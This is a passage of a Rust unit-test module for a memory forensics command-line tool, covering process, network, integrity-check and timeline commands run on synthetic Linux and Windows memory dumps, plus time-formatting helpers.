        std::fs::create_dir_all(&dir).ok();
        // Remove any stale .json files from prior runs
        for entry in std::fs::read_dir(&dir).unwrap() {
            let entry = entry.unwrap();
            if entry.path().extension().is_some_and(|e| e == "json") {
                std::fs::remove_file(entry.path()).ok();
            }
        }

        let result = load_symbols(Some(&dir));
        let err = result.err().expect("should fail with no symbol files");
        let err_msg = format!("{err}");
        assert!(
            err_msg.contains("no symbol files found"),
            "expected 'no symbol files found', got: {err_msg}"
        );
    }

    #[test]
    fn load_symbols_valid_file_succeeds() {
        let isf_path = make_temp_isf_file("load_ok");
        let result = load_symbols(Some(&isf_path));
        assert!(result.is_ok(), "load_symbols should succeed with valid ISF");
        std::fs::remove_file(&isf_path).ok();
    }

    // --- Updated tests: old CR3 bail is gone, now we attempt analysis ---

    #[test]
    fn cmd_ps_with_lime_dump_attempts_analysis() {
        let dump_path = make_temp_lime_dump("ps");
        let isf_path = make_temp_isf_file("ps");
        let result = cmd_ps(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            false,            // threads
            None,             // pid
            false,            // tree
            false,            // masquerade
            false,            // dlls
            false,            // maps
            false,            // envvars
            false,            // cmdline
            false,            // vad
            false,            // privileges
            false,            // elfinfo
            false,            // bash_history
            false,            // all
            PsSortField::Pid, // sort
            None,             // btime
            false,            // raw_fallback
        );
        // May succeed or fail with a walker error, but NOT with old CR3 bail
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    /// `ps --all` on a Linux dump must not trigger Windows-only bails
    /// (e.g. "masquerade is only supported for Windows"). The compiler
    /// warning `unused variable: all` in cmd_ps is the RED signal that
    /// the parameter isn't yet wired into flag expansion.
    #[test]
    fn cmd_ps_all_flag_no_cross_os_bail() {
        let dump_path = make_temp_lime_dump("ps_all");
        let isf_path = make_temp_isf_file("ps_all");
        let result = cmd_ps(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            false,            // threads
            None,             // pid
            false,            // tree
            false,            // masquerade
            false,            // dlls
            false,            // maps
            false,            // envvars
            false,            // cmdline
            false,            // vad
            false,            // privileges
            false,            // elfinfo
            false,            // bash_history
            true,             // all
            PsSortField::Pid, // sort
            None,             // btime
            false,            // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(
                !msg.contains("only supported for Windows"),
                "ps --all on Linux must not enable Windows-only flags, got: {msg}"
            );
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    #[test]
    fn cmd_system_with_lime_dump_lists_modules() {
        let dump_path = make_temp_lime_dump("modules");
        let isf_path = make_temp_isf_file("modules");
        let result = cmd_system(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            false, // mounts
            false, // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    #[test]
    fn cmd_net_with_lime_dump_attempts_analysis() {
        let dump_path = make_temp_lime_dump("netstat");
        let isf_path = make_temp_isf_file("netstat");
        let result = cmd_net(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            None, // pid
            false,
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    // --- New test: cmd_info with crash dump shows metadata ---

    #[test]
    fn cmd_info_shows_metadata_for_crashdump() {
        use memf_format::test_builders::CrashDumpBuilder;

        let page = vec![0u8; 4096];
        let dump = CrashDumpBuilder::new()
            .cr3(0x1ab000)
            .add_run(0, &page)
            .build();
        let dump_path = std::env::temp_dir().join("memf_tdd_info_crash.dmp");
        std::fs::write(&dump_path, &dump).unwrap();

        let result = cmd_info(&dump_path, false);
        assert!(
            result.is_ok(),
            "cmd_info should succeed with crash dump: {:?}",
            result.err()
        );
        std::fs::remove_file(&dump_path).ok();
    }

    // --- New test: setup_analysis detects Windows from crash dump ---

    #[test]
    fn setup_analysis_detects_windows_from_crashdump() {
        use memf_format::test_builders::CrashDumpBuilder;

        let page = vec![0u8; 4096];
        let dump = CrashDumpBuilder::new()
            .cr3(0x1ab000)
            .add_run(0, &page)
            .build();
        let dump_path = std::env::temp_dir().join("memf_tdd_setup_win.dmp");
        std::fs::write(&dump_path, &dump).unwrap();
        let isf_path = make_temp_isf_file("setup_win");

        // This should detect Windows and extract CR3 from metadata
        let result = setup_analysis(&dump_path, Some(&isf_path), None, false);
        match result {
            Ok((ctx, _reader)) => {
                assert_eq!(ctx.os, OsProfile::Windows);
                assert_eq!(ctx.cr3, 0x1ab000);
            }
            Err(e) => {
                let msg = format!("{e}");
                assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
            }
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    // --- New test: setup_analysis uses cr3 override ---

    #[test]
    fn setup_analysis_uses_cr3_override() {
        let dump_path = make_temp_lime_dump("cr3_override");
        let isf_path = make_temp_isf_file("cr3_override");

        let result = setup_analysis(&dump_path, Some(&isf_path), Some(0xDEAD000), false);
        match result {
            Ok((ctx, _reader)) => {
                assert_eq!(ctx.os, OsProfile::Linux);
                assert_eq!(ctx.cr3, 0xDEAD000);
            }
            Err(e) => {
                let msg = format!("{e}");
                assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
            }
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    // --- Existing tests that still pass ---

    #[test]
    fn format_size_gb() {
        let result = format_size(2 * 1024 * 1024 * 1024);
        assert!(result.contains("GB"), "expected GB, got: {result}");
        assert!(result.contains("2.00"));
    }

    #[test]
    fn format_size_mb() {
        let result = format_size(5 * 1024 * 1024);
        assert!(result.contains("MB"), "expected MB, got: {result}");
        assert!(result.contains("5.00"));
    }

    #[test]
    fn format_size_kb() {
        let result = format_size(8 * 1024);
        assert!(result.contains("KB"), "expected KB, got: {result}");
        assert!(result.contains("8.00"));
    }

    #[test]
    fn format_size_bytes() {
        let result = format_size(512);
        assert!(result.contains('B'), "expected B, got: {result}");
        assert!(result.contains("512"));
    }

    #[test]
    fn format_size_zero() {
        let result = format_size(0);
        assert_eq!(result, "0 B");
    }

    #[test]
    fn cmd_info_produces_output() {
        let dump_path = make_temp_lime_dump("info");
        let result = cmd_info(&dump_path, false);
        assert!(
            result.is_ok(),
            "cmd_info should succeed: {:?}",
            result.err()
        );
        std::fs::remove_file(&dump_path).ok();
    }

    #[test]
    fn cmd_strings_from_file() {
        use std::io::Write;
        let path = std::env::temp_dir().join("memf_tdd_cli_strings_file.txt");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "https://evil.com/malware.exe").unwrap();
        writeln!(f, "192.168.1.100").unwrap();
        writeln!(f, "just some text").unwrap();

        let result = cmd_strings(
            None,
            Some(path.clone()),
            4,
            OutputFormat::Table,
            None,
            false,
        );
        assert!(
            result.is_ok(),
            "cmd_strings --from-file should succeed: {:?}",
            result.err()
        );
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn cmd_strings_with_dump() {
        let dump_path = make_temp_lime_dump("strings_dump");
        let result = cmd_strings(Some(&dump_path), None, 4, OutputFormat::Table, None, false);
        assert!(
            result.is_ok(),
            "cmd_strings with dump should succeed: {:?}",
            result.err()
        );
        std::fs::remove_file(&dump_path).ok();
    }

    #[test]
    fn cmd_strings_no_source_errors() {
        let result = cmd_strings(None, None, 4, OutputFormat::Table, None, false);
        assert!(result.is_err());
        let err_msg = format!("{}", result.unwrap_err());
        assert!(err_msg.contains("provide either"));
    }

    #[test]
    fn cmd_strings_json_output() {
        use std::io::Write;
        let path = std::env::temp_dir().join("memf_tdd_cli_strings_json.txt");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "https://evil.com/malware.exe").unwrap();

        let result = cmd_strings(None, Some(path.clone()), 4, OutputFormat::Json, None, false);
        assert!(result.is_ok());
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn cmd_strings_csv_output() {
        use std::io::Write;
        let path = std::env::temp_dir().join("memf_tdd_cli_strings_csv.txt");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "192.168.1.1").unwrap();

        let result = cmd_strings(None, Some(path.clone()), 4, OutputFormat::Csv, None, false);
        assert!(result.is_ok());
        std::fs::remove_file(&path).ok();
    }

    // --- auto-symbol resolution ---

    /// Build a minimal PE (PE32+/AMD64) with an embedded CodeView RSDS debug record.
    fn build_pe_with_debug(guid_bytes: [u8; 16], age: u32, pdb_name: &str) -> Vec<u8> {
        let mut buf = vec![0u8; 4096];

        // DOS header
        buf[0] = b'M';
        buf[1] = b'Z';
        let pe_offset: u32 = 0x80;
        buf[0x3C..0x40].copy_from_slice(&pe_offset.to_le_bytes());

        let mut pos = pe_offset as usize;

        // PE signature
        buf[pos..pos + 4].copy_from_slice(b"PE\0\0");
        pos += 4;

        // COFF header (20 bytes)
        buf[pos..pos + 2].copy_from_slice(&0x8664u16.to_le_bytes()); // AMD64
        buf[pos + 2..pos + 4].copy_from_slice(&1u16.to_le_bytes()); // 1 section
        let opt_hdr_size: u16 = 240;
        buf[pos + 16..pos + 18].copy_from_slice(&opt_hdr_size.to_le_bytes());
        buf[pos + 18..pos + 20].copy_from_slice(&0x0022u16.to_le_bytes());
        pos += 20;

        // Optional header (PE32+)
        let opt_start = pos;
        buf[pos..pos + 2].copy_from_slice(&0x020Bu16.to_le_bytes());
        buf[opt_start + 32..opt_start + 36].copy_from_slice(&0x1000u32.to_le_bytes());
        buf[opt_start + 36..opt_start + 40].copy_from_slice(&0x200u32.to_le_bytes());
        buf[opt_start + 56..opt_start + 60].copy_from_slice(&0x2000u32.to_le_bytes());
        buf[opt_start + 60..opt_start + 64].copy_from_slice(&0x200u32.to_le_bytes());
        buf[opt_start + 108..opt_start + 112].copy_from_slice(&16u32.to_le_bytes());

        // Debug directory (index 6) -> RVA 0x200
        let debug_dir_rva: u32 = 0x200;
        let debug_dir_size: u32 = 28;
        buf[opt_start + 160..opt_start + 164].copy_from_slice(&debug_dir_rva.to_le_bytes());
        buf[opt_start + 164..opt_start + 168].copy_from_slice(&debug_dir_size.to_le_bytes());

        pos = opt_start + opt_hdr_size as usize;

        // Section header — .rdata mapping RVA 0x200 to file offset 0x200
        buf[pos..pos + 8].copy_from_slice(b".rdata\0\0");
        buf[pos + 8..pos + 12].copy_from_slice(&0x1000u32.to_le_bytes());
        buf[pos + 12..pos + 16].copy_from_slice(&0x200u32.to_le_bytes());
        buf[pos + 16..pos + 20].copy_from_slice(&0x200u32.to_le_bytes());
        buf[pos + 20..pos + 24].copy_from_slice(&0x200u32.to_le_bytes());

        // IMAGE_DEBUG_DIRECTORY at file offset 0x200
        let ddo = 0x200usize;
        let cv_rva: u32 = 0x220;
        let pdb_bytes = pdb_name.as_bytes();
        let cv_size: u32 = (24 + pdb_bytes.len() + 1) as u32;
        buf[ddo + 12..ddo + 16].copy_from_slice(&2u32.to_le_bytes()); // CODEVIEW
        buf[ddo + 16..ddo + 20].copy_from_slice(&cv_size.to_le_bytes());
        buf[ddo + 20..ddo + 24].copy_from_slice(&cv_rva.to_le_bytes());
        buf[ddo + 24..ddo + 28].copy_from_slice(&cv_rva.to_le_bytes());

        // CodeView RSDS record at file offset 0x220
        let cvo = 0x220usize;
        buf[cvo..cvo + 4].copy_from_slice(b"RSDS");
        buf[cvo + 4..cvo + 20].copy_from_slice(&guid_bytes);
        buf[cvo + 20..cvo + 24].copy_from_slice(&age.to_le_bytes());
        let ns = cvo + 24;
        buf[ns..ns + pdb_bytes.len()].copy_from_slice(pdb_bytes);
        buf[ns + pdb_bytes.len()] = 0;

        buf
    }

    // Known GUID bytes (mixed-endian) → "1B72224D-37B8-1792-2820-0ED8994498B2"
    const TEST_GUID_BYTES: [u8; 16] = [
        0x4D, 0x22, 0x72, 0x1B, 0xB8, 0x37, 0x92, 0x17, 0x28, 0x20, 0x0E, 0xD8, 0x99, 0x44, 0x98,
        0xB2,
    ];

    #[test]
    fn load_symbols_error_suggests_info() {
        let dir = std::env::temp_dir().join("memf_tdd_cli_no_syms_hint");
        std::fs::create_dir_all(&dir).ok();
        for entry in std::fs::read_dir(&dir).unwrap() {
            let entry = entry.unwrap();
            if entry
                .path()
                .extension()
                .is_some_and(|e| e == "json" || e == "pdb")
            {
                std::fs::remove_file(entry.path()).ok();
            }
        }

        let result = load_symbols(Some(&dir));
        let err_msg = format!("{}", result.err().expect("should fail"));
        assert!(
            err_msg.contains("memf info"),
            "error should suggest 'memf info', got: {err_msg}"
        );
    }

    #[test]
    fn find_kernel_pdb_finds_ntkrnl_pe() {
        let pe = build_pe_with_debug(TEST_GUID_BYTES, 1, "ntkrnlmp.pdb");

        // Raw dump: 4KB zeros + 4KB PE at physical address 0x1000
        let mut dump = vec![0u8; 4096];
        let mut pe_page = pe;
        pe_page.resize(4096, 0);
        dump.extend_from_slice(&pe_page);

        let path = std::env::temp_dir().join("memf_tdd_kernel_pdb_find.raw");
        std::fs::write(&path, &dump).unwrap();

        let provider = memf_format::open_dump_with_raw_fallback(&path).unwrap();
        let result = find_kernel_pdb_in_physmem(provider.as_ref());

        assert!(result.is_some(), "should find kernel PDB in physmem");
        let pdb_id = result.unwrap();
        assert_eq!(pdb_id.pdb_name, "ntkrnlmp.pdb");
        assert_eq!(pdb_id.age, 1);
        assert_eq!(pdb_id.guid, "1B72224D-37B8-1792-2820-0ED8994498B2");

        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn find_kernel_pdb_ignores_non_kernel_pe() {
        let pe = build_pe_with_debug([0xAA; 16], 1, "userapp.pdb");

        let mut dump = vec![0u8; 4096];
        let mut pe_page = pe;
        pe_page.resize(4096, 0);
        dump.extend_from_slice(&pe_page);

        let path = std::env::temp_dir().join("memf_tdd_kernel_pdb_nonkern.raw");
        std::fs::write(&path, &dump).unwrap();

        let provider = memf_format::open_dump_with_raw_fallback(&path).unwrap();
        let result = find_kernel_pdb_in_physmem(provider.as_ref());

        assert!(result.is_none(), "should not match non-kernel PE");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn find_kernel_pdb_no_pe_returns_none() {
        let dump = vec![0xBBu8; 8192];
        let path = std::env::temp_dir().join("memf_tdd_kernel_pdb_nope.raw");
        std::fs::write(&path, &dump).unwrap();

        let provider = memf_format::open_dump_with_raw_fallback(&path).unwrap();
        let result = find_kernel_pdb_in_physmem(provider.as_ref());

        assert!(result.is_none(), "should not find PDB in plain data");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn cmd_check_syscalls_with_lime_dump_via_check() {
        let dump_path = make_temp_lime_dump("syscalls");
        let isf_path = make_temp_isf_file("syscalls");
        let result = cmd_check(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            true,  // syscalls
            false, // hooks
            false, // irp
            false, // ssdt
            false, // callbacks
            false, // malfind
            false, // psxview
            false, // tty
            false, // modules
            false, // ldrmodules
            false, // hollowing
            false, // all
            None,  // pid
            false, // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    // --- CLI restructure: new dispatch function tests ---

    #[test]
    fn cmd_system_with_lime_dump_attempts_analysis() {
        let dump_path = make_temp_lime_dump("system");
        let isf_path = make_temp_isf_file("system");
        let result = cmd_system(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            false, // mounts
            false, // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    #[test]
    fn cmd_system_with_mounts_flag() {
        let dump_path = make_temp_lime_dump("system_mounts");
        let isf_path = make_temp_isf_file("system_mounts");
        let result = cmd_system(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            true, // mounts
            false,
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    #[test]
    fn cmd_check_malfind_with_lime_dump_attempts_analysis() {
        let dump_path = make_temp_lime_dump("check_malfind");
        let isf_path = make_temp_isf_file("check_malfind");
        let result = cmd_check(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            false,
            false,
            false,
            false,
            false, // syscalls, hooks, irp, ssdt, callbacks
            true,  // malfind
            false,
            false,
            false, // psxview, tty, modules
            false, // ldrmodules
            false, // hollowing
            false, // all
            None,  // pid
            false, // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    #[test]
    fn cmd_check_syscalls_with_lime_dump_attempts_analysis() {
        let dump_path = make_temp_lime_dump("check_syscalls");
        let isf_path = make_temp_isf_file("check_syscalls");
        let result = cmd_check(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            true, // syscalls
            false,
            false,
            false,
            false, // hooks, irp, ssdt, callbacks
            false,
            false,
            false,
            false, // malfind, psxview, tty, modules
            false, // ldrmodules
            false, // hollowing
            false, // all
            None,  // pid
            false, // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    /// `--all` should expand into platform-appropriate checks. On our tiny
    /// LiME stub (Linux), it must attempt at least one check (which will
    /// fail reading kernel data), proving the flags were actually enabled.
    /// It must NOT silently return Ok(()) or hit cross-OS bails.
    #[test]
    fn cmd_check_all_flag_enables_linux_checks() {
        let dump_path = make_temp_lime_dump("check_all");
        let isf_path = make_temp_isf_file("check_all");
        let result = cmd_check(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            false, // syscalls
            false, // hooks
            false, // irp
            false, // ssdt
            false, // callbacks
            false, // malfind
            false, // psxview
            false, // tty
            false, // modules
            false, // ldrmodules
            false, // hollowing
            true,  // all
            None,  // pid
            false, // raw_fallback
        );
        // --all on a Linux dump must attempt checks. Our stub has no real
        // kernel data, so analysis will fail — but failure proves the check
        // was attempted. A silent Ok(()) means --all didn't enable anything.
        assert!(
            result.is_err(),
            "--all should have enabled Linux checks that fail on the stub dump, \
             but got Ok(()) — flags were not expanded"
        );
        let msg = format!("{}", result.unwrap_err());
        // Must not hit cross-OS bails
        assert!(
            !msg.contains("only available for Windows"),
            "--all on Linux must not enable Windows-only checks, got: {msg}"
        );
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    #[test]
    fn cmd_handles_with_lime_dump_attempts_analysis() {
        let dump_path = make_temp_lime_dump("handles");
        let isf_path = make_temp_isf_file("handles");
        let result = cmd_handles(
            &dump_path,
            Some(&isf_path),
            OutputFormat::Table,
            None,
            None,  // pid
            false, // raw_fallback
        );
        if let Err(e) = &result {
            let msg = format!("{e}");
            assert!(!msg.contains("CR3 auto-detection"), "got old bail: {msg}");
        }
        std::fs::remove_file(&dump_path).ok();
        std::fs::remove_file(&isf_path).ok();
    }

    // --- Boot time formatting tests ---

    #[test]
    fn format_epoch_known_dates() {
        // Unix epoch
        assert_eq!(format_epoch(0), "1970-01-01 00:00:00 UTC");
        // 2024-04-02 03:26:40 UTC (1712028400)
        assert_eq!(format_epoch(1_712_028_400), "2024-04-02 03:26:40 UTC");
        // 2000-01-01 00:00:00 UTC (946684800)
        assert_eq!(format_epoch(946_684_800), "2000-01-01 00:00:00 UTC");
    }

    #[test]
    fn days_to_ymd_epoch() {
        assert_eq!(days_to_ymd(0), (1970, 1, 1));
    }

    #[test]
    fn days_to_ymd_leap_year() {
        // 2000-02-29 is day 11016 since epoch
        // (30 years * 365 + 7 leap days + 31 jan + 28 feb = 10987 + 29 = 11016)
        // Actually let's just check a known date.
        // 2024-01-01 = 19723 days since epoch
        assert_eq!(days_to_ymd(19723), (2024, 1, 1));
    }

    #[test]
    fn format_boot_ns_values() {
        assert_eq!(format_boot_ns(0), "0.000s");
        assert_eq!(format_boot_ns(1_500_000_000), "1.500s");
        assert_eq!(format_boot_ns(90_000_000_000), "1m30s");
        assert_eq!(format_boot_ns(3_661_000_000_000), "1h01m01s");
        assert_eq!(format_boot_ns(90_061_000_000_000), "1d01h01m");
    }

    #[test]
    fn pstree_table_includes_absolute_timestamps_when_boot_known() {
        use memf_linux::{
            BootTimeEstimate, BootTimeInfo, BootTimeSource, ProcessInfo, ProcessState, PsTreeEntry,
        };

        let boot_info = BootTimeInfo::from_estimates(vec![BootTimeEstimate {
            source: BootTimeSource::UserProvided,
            boot_epoch_secs: 1_712_000_000, // 2024-04-02 ~04:00 UTC
        }]);

        let entries = vec![
            PsTreeEntry {
                process: ProcessInfo {
                    pid: 1,
                    ppid: 0,
                    comm: "systemd".into(),
                    state: ProcessState::Sleeping,
                    vaddr: 0xFFFF_8000_0010_0000,
                    cr3: None,
                    start_time: 500_000_000, // 0.5s after boot
                },
                depth: 0,
            },
            PsTreeEntry {
                process: ProcessInfo {
                    pid: 100,
                    ppid: 1,
                    comm: "sshd".into(),
                    state: ProcessState::Sleeping,
                    vaddr: 0xFFFF_8000_0020_0000,
                    cr3: None,
                    start_time: 60_000_000_000, // 60s after boot
                },
                depth: 1,
            },
        ];

        // Capture table output — the function prints to stdout.
        // We verify it compiles and accepts boot_info; the key assertion
        // is that the header includes "Start (UTC)" when boot time is known.
        print_linux_pstree(&entries, OutputFormat::Table, &boot_info);

        // Also verify JSON output includes start_utc field.
        print_linux_pstree(&entries, OutputFormat::Json, &boot_info);

        // And CSV output includes start_utc column.
        print_linux_pstree(&entries, OutputFormat::Csv, &boot_info);
    }

    #[test]
    fn pstree_table_omits_absolute_timestamps_when_boot_unknown() {
        use memf_linux::{BootTimeInfo, ProcessInfo, ProcessState, PsTreeEntry};

        let boot_info = BootTimeInfo::from_estimates(vec![]);

        let entries = vec![PsTreeEntry {
            process: ProcessInfo {
                pid: 1,
                ppid: 0,
                comm: "init".into(),
                state: ProcessState::Running,
                vaddr: 0xFFFF_8000_0010_0000,
                cr3: None,
                start_time: 0,
            },
            depth: 0,
        }];

        // Should compile and work without boot info — no Start (UTC) column.
        print_linux_pstree(&entries, OutputFormat::Table, &boot_info);
        print_linux_pstree(&entries, OutputFormat::Json, &boot_info);
        print_linux_pstree(&entries, OutputFormat::Csv, &boot_info);
    }

    #[test]
    fn format_filetime_known_dates() {
        // Windows FILETIME: 100-nanosecond intervals since 1601-01-01 00:00:00 UTC
        // Unix epoch (1970-01-01) = 116444736000000000 in FILETIME
        // 2024-04-02 03:26:40 UTC = Unix 1712028400 = FILETIME 116444736000000000 + 1712028400 * 10_000_000
        let unix_epoch_ft: u64 = 116_444_736_000_000_000;
        assert_eq!(format_filetime(unix_epoch_ft), "1970-01-01 00:00:00 UTC");

        // 2024-04-02 03:26:40 UTC
        let ft_2024 = unix_epoch_ft + 1_712_028_400 * 10_000_000;
        assert_eq!(format_filetime(ft_2024), "2024-04-02 03:26:40 UTC");

        // Zero FILETIME = not set
        assert_eq!(format_filetime(0), "-");

        // 2000-01-01 00:00:00 UTC = Unix 946684800
        let ft_2000 = unix_epoch_ft + 946_684_800 * 10_000_000;
        assert_eq!(format_filetime(ft_2000), "2000-01-01 00:00:00 UTC");
    }

    #[test]
    fn format_filetime_used_in_windows_ps_output() {
        use memf_windows::WinProcessInfo;

        // Verify print_windows_processes compiles with format_filetime integration.
        // We create a synthetic process and render it — the function should use
        // format_filetime() for create_time, not raw hex.
        let procs = vec![WinProcessInfo {
            pid: 4,
            ppid: 0,
            image_name: "System".into(),
            create_time: 132_800_000_000_000_000, // ~2021-11-15
            exit_time: 0,
            cr3: 0x1AB000,
            peb_addr: 0,
            vaddr: 0xFFFF_8000_0020_0000,
            thread_count: 100,
            is_wow64: false,
        }];

        // Should not panic and should format times as UTC, not hex.
        print_windows_processes(&procs, OutputFormat::Table);
        print_windows_processes(&procs, OutputFormat::Json);
        print_windows_processes(&procs, OutputFormat::Csv);
    }

    // --- Timeline tests ---

    #[test]
    fn filetime_to_unix_epoch_2000() {
        // 2000-01-01 00:00:00 UTC = Unix 946_684_800
        // FILETIME = FILETIME_UNIX_DIFF + 946_684_800 * 10_000_000
        const FILETIME_UNIX_DIFF: u64 = 116_444_736_000_000_000;
        let ft_2000 = FILETIME_UNIX_DIFF + 946_684_800 * 10_000_000;
        assert_eq!(filetime_to_unix(ft_2000), Some(946_684_800));
    }

    #[test]
    fn filetime_to_unix_zero_returns_none() {
        assert_eq!(filetime_to_unix(0), None);
    }

    #[test]
    fn filetime_to_unix_pre_1970_returns_none() {
        // Any FILETIME before the Unix epoch offset
        assert_eq!(filetime_to_unix(100), None);
    }

    #[test]
    fn build_windows_timeline_processes_and_connections() {
        use memf_windows::{WinConnectionInfo, WinProcessInfo, WinTcpState};

        // create_time ~2021-10-29 18:13:20 UTC → Unix 1_635_526_400
        let procs = vec![WinProcessInfo {
            pid: 4,
            ppid: 0,
            image_name: "System".into(),
            create_time: 132_800_000_000_000_000,
            exit_time: 0, // still running → no exit event
            cr3: 0x1AB000,
            peb_addr: 0,
            vaddr: 0xFFFF_8000_0020_0000,
            thread_count: 100,
            is_wow64: false,
        }];

        // connection create_time 10_000s later → Unix 1_635_536_400
        let conns = vec![WinConnectionInfo {
            protocol: "TCP".into(),
            local_addr: "10.0.0.1".into(),
            local_port: 445,
            remote_addr: "10.0.0.2".into(),
            remote_port: 49152,
            state: WinTcpState::Established,
            pid: 4,
            process_name: "System".into(),
            create_time: 132_800_100_000_000_000,
        }];

        let events = build_windows_timeline(&procs, &conns);

        // Should have 2 events: 1 process_create + 1 connection_create
        // (no exit event since exit_time is 0)
        assert_eq!(events.len(), 2);

        // Events sorted by timestamp
        assert_eq!(events[0].event_type, "process_create");
        assert_eq!(events[0].pid, 4);
        assert_eq!(events[0].timestamp_secs, 1_635_526_400);
        assert!(events[0].description.contains("System"));

        assert_eq!(events[1].event_type, "connection_create");
        assert_eq!(events[1].pid, 4);
        assert_eq!(events[1].timestamp_secs, 1_635_536_400);
    }

    #[test]
    fn build_windows_timeline_includes_exit_events() {
        use memf_windows::WinProcessInfo;

        // Process with both create and exit times
        let procs = vec![WinProcessInfo {
            pid: 1234,
            ppid: 4,
            image_name: "notepad.exe".into(),
            create_time: 132_800_000_000_000_000, // Unix 1_635_526_400
            exit_time: 132_800_100_000_000_000,   // Unix 1_635_536_400
            cr3: 0x2AB000,
            peb_addr: 0x7FFE_0000,
            vaddr: 0xFFFF_8000_0030_0000,
            thread_count: 1,
            is_wow64: false,
        }];

        let events = build_windows_timeline(&procs, &[]);

        assert_eq!(events.len(), 2);
        assert_eq!(events[0].event_type, "process_create");
        assert_eq!(events[0].timestamp_secs, 1_635_526_400);
        assert_eq!(events[1].event_type, "process_exit");
        assert_eq!(events[1].timestamp_secs, 1_635_536_400);
    }

    #[test]
    fn build_linux_timeline_with_boot_epoch() {
        use memf_linux::{ProcessInfo, ProcessState};

        let procs = vec![
            ProcessInfo {
                pid: 1,
                ppid: 0,
                comm: "systemd".into(),
                state: ProcessState::Sleeping,
                vaddr: 0xFFFF_8000_0010_0000,
                cr3: None,
                start_time: 500_000_000, // 0.5s after boot → epoch + 0
            },
            ProcessInfo {
                pid: 100,
                ppid: 1,
                comm: "sshd".into(),
                state: ProcessState::Sleeping,
                vaddr: 0xFFFF_8000_0020_0000,
                cr3: None,
                start_time: 3_600_000_000_000, // 3600s after boot
            },
        ];

        let boot_epoch = Some(1_712_000_000i64); // 2024-04-02 ~04:00 UTC
        let events = build_linux_timeline(&procs, boot_epoch);

        assert_eq!(events.len(), 2);

        // Sorted by timestamp
        assert_eq!(events[0].event_type, "process_start");
        assert_eq!(events[0].pid, 1);
        assert_eq!(events[0].timestamp_secs, 1_712_000_000); // boot + 0s
        assert!(events[0].description.contains("systemd"));

        assert_eq!(events[1].event_type, "process_start");
        assert_eq!(events[1].pid, 100);
        assert_eq!(events[1].timestamp_secs, 1_712_003_600); // boot + 3600s
        assert!(events[1].description.contains("sshd"));
    }

    #[test]
    fn build_linux_timeline_without_boot_epoch_is_empty() {
        use memf_linux::{ProcessInfo, ProcessState};

        let procs = vec![ProcessInfo {
            pid: 1,
            ppid: 0,
            comm: "init".into(),
            state: ProcessState::Running,
            vaddr: 0xFFFF_8000_0010_0000,
            cr3: None,
            start_time: 500_000_000,
        }];

        let events = build_linux_timeline(&procs, None);
        assert!(events.is_empty());
    }

    #[test]
    fn print_timeline_table_does_not_panic() {
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "process_start".into(),
            pid: 1,
            description: "systemd".into(),
            tags: vec![],
        }];
        print_timeline(&events, OutputFormat::Table);
    }

    #[test]
    fn print_timeline_json_does_not_panic() {
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "process_create".into(),
            pid: 4,
            description: "System".into(),
            tags: vec![],
